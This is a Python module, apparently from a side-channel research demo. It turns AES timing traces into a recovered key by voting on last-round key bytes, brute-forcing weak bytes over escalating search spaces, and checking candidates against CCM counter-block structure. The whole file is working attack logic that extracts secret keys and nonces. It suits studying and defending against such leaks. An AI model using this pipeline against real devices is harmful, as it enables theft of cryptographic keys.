"""Key recovery as the attacker can actually run it.

`flashattack.engine.recover` does the cryptanalysis: scan all 120 pairs of
last-round S-box lookups, vote per key byte, hand back a ranked candidate list
and a per-byte confidence. What it cannot do here is finish the job the usual
way, because its brute-force step wants a known plaintext/ciphertext pair under
the target key and the attacker has no such thing -- it sees AES *outputs* only
(see verify.py).

So the last step is done against CCM's own structure instead: a candidate key is
accepted when `D(K, S_1)` comes back shaped like a counter block on several
independent traces. That is 24 bits of check per trace, it needs no secret, and
it is exactly the moment the attacker learns the nonce.
"""
from __future__ import annotations

from itertools import product

import numpy as np

from flashattack import aesref, bruteforce, engine

import verify


def recover_and_verify(known_blocks, timing, keystreams, *, cand_per_pos=8,
                       weak_positions=3, max_search_bytes=3, log=None,
                       pair_offsets="auto", line_off=0, vote_only=False):
    """(master_key or None, engine Result, notes).

    `pair_offsets` restricts the vote to the byte offsets that actually leak.
    "auto" finds them with `engine.leaking_offsets`, which uses no key; None
    scans all 120 pairs, of which 104 contribute only noise here.

    `line_off` is where the S-box starts inside its 16-byte flash row, in table
    entries, and IT IS NOT OPTIONAL: it is a property of the victim image, so
    the caller reads it off the ELF (or out of the vector's geometry file) and
    passes it. The version of this file in the original tree defaulted it to 0
    and never passed anything, which scored this demo's own capture at the
    wrong geometry: 3/16 round-key bytes at 150 000 traces where the image's
    real offset of 12 gives 16/16 and a verified key. Wrong is not a little
    wrong. See the demo README.
    """
    if pair_offsets == "auto":
        pair_offsets, _peaks = engine.leaking_offsets(known_blocks, timing,
                                                      line_off=line_off)
        pair_offsets = pair_offsets or None
        if log:
            log(f"  leaking byte offsets (found without the key): {pair_offsets}")
    res = engine.recover(known_blocks, timing, direction="enc", keysize=128,
                         line_shift=4, cand_per_pos=cand_per_pos, log=log,
                         pair_offsets=pair_offsets, line_off=line_off)
    notes = []

    def master_from(rk):
        return aesref.invert_key_schedule(list(rk), 128)

    def ok(mk):
        return verify.check(mk, keystreams, n=4)[0]

    rk0 = bytearray(res.roundkey)
    mk = master_from(rk0)
    if ok(mk):
        return bytes(mk), res, ["verified straight from the vote"]

    # `vote_only` stops here on purpose. It is how the trace ladder in the
    # README is measured: what the vote alone resolves, with no brute-force
    # escalation paid for out of the attacker's CPU. Escalating is real and it
    # is cheap, but a ladder that includes it measures two things at once.
    if vote_only:
        return None, res, ["vote only: no escalation attempted"]

    # Weakest bytes first, from the ranked candidates the vote produced.
    order = sorted(range(16), key=lambda i: res.confidence[i])
    tried = 0
    for npos in range(1, weak_positions + 1):
        positions = order[:npos]
        lists = [[v for v, _ in res.candidates[p]] for p in positions]
        for combo in product(*lists):
            rk = bytearray(res.roundkey)
            for p, v in zip(positions, combo):
                rk[p] = v
            tried += 1
            mk = master_from(rk)
            if ok(mk):
                notes.append(f"fixed {npos} low-confidence byte(s) {positions} "
                             f"from the ranked candidates after {tried} tries")
                return bytes(mk), res, notes

    # Escalate: full 0..255 on each weak byte on its own (cheap and catches the
    # common case where exactly one byte is wrong but not the least confident).
    for p in order[:8]:
        for v in range(256):
            rk = bytearray(res.roundkey)
            rk[p] = v
            tried += 1
            mk = master_from(rk)
            if ok(mk):
                notes.append(f"brute-forced byte {p} over the full range "
                             f"after {tried} tries")
                return bytes(mk), res, notes

    # Two wrong bytes is the common near-miss, and the ranked-candidate route
    # above only finds them if the vote was *also* least confident about them --
    # which is not reliable (at 300 k the wrong pair ranks 1st and 4th). Sweeping
    # every pair at full range costs 7.9 M candidates, less than one 2^24 search,
    # and turns "usually" into "whenever the vote is 14/16 or better".
    mk, pair = bruteforce.search_pairs(res.roundkey, keystreams, log=log)
    if mk is not None:
        notes.append(f"brute-forced byte positions {list(pair)} over the full "
                     f"range (all 120 pairs, 2^16 each)")
        return mk, res, notes

    # Beyond one byte, searching key-by-key in Python is hopeless, so hand the
    # job to the batched multi-key AES: 2^16 is instant and 2^24 about half a
    # minute. Only worth it where the vote is uneven -- on a victim whose pairs
    # all leak it never gets this far.
    for npos in range(2, max_search_bytes + 1):
        positions = sorted(order[:npos])
        if log:
            log(f"  searching 2^{8 * npos} over byte positions {positions}")
        mk = bruteforce.search_positions(res.roundkey, positions, keystreams,
                                         log=log)
        if mk is not None:
            notes.append(f"brute-forced byte positions {positions} over the "
                         f"full range (2^{8 * npos} candidates)")
            return mk, res, notes

    notes.append(f"no candidate verified after {tried} tries and a "
                 f"2^{8 * max_search_bytes} search")
    return None, res, notes


def score_against(res, true_master):
    """Validation only: how many round-key bytes the vote got right."""
    truth = bytes(aesref.key_expansion(true_master)[-1])
    return sum(res.roundkey[i] == truth[i] for i in range(16)), truth
